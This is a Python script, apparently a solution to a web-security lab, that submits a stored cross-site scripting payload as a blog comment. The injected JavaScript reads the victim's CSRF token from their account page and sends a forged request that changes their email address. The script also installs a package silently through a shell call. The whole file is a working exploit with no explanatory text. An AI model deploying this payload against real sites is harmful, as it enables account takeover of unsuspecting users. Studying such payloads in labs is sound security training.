import requests
import urllib3
from sys import argv
try:
    import termcolor
except:
    import os
    os.system("pip3 install termcolor")
    import termcolor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def red(text):
    return termcolor.colored(text,"red")


def get_website_urls():
    if len(argv) != 4:
        print(f"[+] usage {argv[0]} <url> <csrf> <session>")
        print(f"[+] example {argv[0]} 'http://example.com' 'BWyN0dGCrWgHVL0Pp4EoZTXGAgKFRbT9' 'S5FqpElto2doUXJvlDSSEeTPYrwQxKgx'")
        exit(-1)

    if argv[1][-1] == '/':
        url = argv[1][:-1]
    else:
        url = argv[1]
    csrf = argv[2]
    session = argv[3]
    return url, csrf, session

def attack(): 
    print("[+] Starting attack")
    url, csrf, session = get_website_urls()
    posts_path = "/post/comment"  
    xss_payload = "\
\n\t<script>\n\
\t  fetch('/my-account')\n\
\t    .then(r => r.text())\n\
\t    .then(t => t.match(/name=\"csrf\" value=\"(\\w+)\"/))\n\
\t    .then(m => m && fetch('/my-account/change-email', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: `csrf=${m[1]}&email=test@test.com` }))\n\
\t    .then(r => r.ok ? console.log('Email changed successfully.') : console.error('Email change failed with status ' + r.status))\n\
\t    .catch(e => console.error('Error:', e));\n\
\t</script>"

    print(f"[+] sending xss payload : {red(xss_payload)}")
    params = {
        "csrf"   : csrf,
        "postId" : "1",
        "comment": xss_payload,
        "name"   : "attacker",
        "email"  : "attacker@attack.com",
        "website": ""
        }

    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Origin": url,
        "Dnt": "1",
        "Referer": f"{url}/post?postId=1",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Te": "trailers"
    }

    cookie = {"session": session}

    r = requests.post(url + posts_path, data=params, cookies=cookie)
  
    r = requests.get(url)

    if 'Congratulations' in r.text:
        print("[+] attack successfully")
    else:
        r = requests.get(url, cookies=cookie)
        if 'Congratulations' in r.text:
            print("[+] attack successfully")
        else:
            print("[-] Attack un successfully")

attack()